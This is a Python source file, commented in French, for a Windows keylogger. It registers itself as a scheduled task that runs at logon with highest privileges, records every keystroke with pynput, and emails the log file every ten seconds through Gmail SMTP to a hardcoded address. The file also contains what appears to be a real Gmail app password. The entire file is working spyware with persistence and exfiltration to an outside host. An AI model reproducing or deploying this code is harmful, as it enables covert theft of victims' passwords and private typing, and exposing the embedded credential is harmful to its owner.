import logging
from threading import Thread
import PIL.ImageGrab
from pynput.keyboard import Key, Listener
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import subprocess
import time
import os


#--------DÉBUT TÂCHES PROGRAMMÉES---------------

# Définir le chemin de l'exécutable
executable_path = os.path.join(os.getcwd(), 'keyloggerWindows.exe')

# Définir les paramètres de la tâche planifiée
task_name = "Mon programme au démarrage"
delay = 30  # Délai en secondes

# Commande pour créer une tâche planifiée qui exécute l'exécutable au démarrage avec temporisation
task_command = (
    f'schtasks /create /tn "{task_name}" /tr "cmd /c timeout /t {delay} & {executable_path}" '
    f'/sc onlogon /rl highest /f'
)
# Vérifier si la tâche existe déjà
check_task = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True, text=True)

# Ajouter la tâche planifiée si elle n'existe pas
if "ERROR" in check_task.stdout:
    result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"L'exécutable a été ajouté au démarrage avec le nom de tâche '{task_name}'.")
    else:
        print("Erreur lors de la création de la tâche :", result.stderr)
else:
    print("L'exécutable est déjà configuré pour démarrer automatiquement.")


#--------FIN TÂCHES PROGRAMMÉES----------------


#--------DÉBUT PARTIE ENVOI MAIL----------------

def sendMail():
    # Configuration pour l'envoi de mail
    port = 465
    smtp_server = "smtp.gmail.com"
    sender_email = "amazonoussama640@gmail.com"  # adresse mail bidon d'où le mail va être envoyé
    receiver_email = "oussamaau123@gmail.com"    # adresse mail sur laquelle on veut recevoir le mail
    password = "tdcf hoql nrco flxv"             # mot de passe de l'expéditeur
    objet = "Fichier du keylog"
    corps = "Envoi du fichier keylog"

    # Création d'un mail multipart
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = objet

    message.attach(MIMEText(corps, "plain"))

    filename = "keylogs.txt"

    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )
        message.attach(part)


        context = ssl.create_default_context()

        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())

        print("Le mail a été envoyé")  # À enlever plus tard
    except Exception as e:
        print(f"Erreur lors de l'envoi du mail : {e}")

#--------FIN PARTIE ENVOI MAIL------------------

logging.basicConfig(filename="keylogs.txt", filemode="w",
                    datefmt='%d/%m/%Y %I:%M:%S %p', format='%(asctime)s:%(message)s', level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))



# Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
def mail_thread():
    while True:
        time.sleep(10) #Temps d'attente entre deux mails
        sendMail()

# L'envoi du mail se fait sur un thread séparé
Thread(target=mail_thread, daemon=True).start()


with Listener(on_press=on_press) as listener:
    listener.join()
